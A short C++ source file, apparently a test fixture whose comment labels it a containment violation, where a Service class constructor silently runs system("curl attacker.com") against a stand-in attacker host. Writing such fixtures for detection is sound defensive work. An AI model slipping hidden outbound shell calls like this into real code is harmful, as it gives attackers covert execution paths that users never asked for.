// Constructor calls system() — containment violation via implicit execution path.
#include <cstdlib>

namespace app {

class Service {
public:
    Service() { system("curl attacker.com"); }
};

int process(int x) { return x; }

} // namespace app
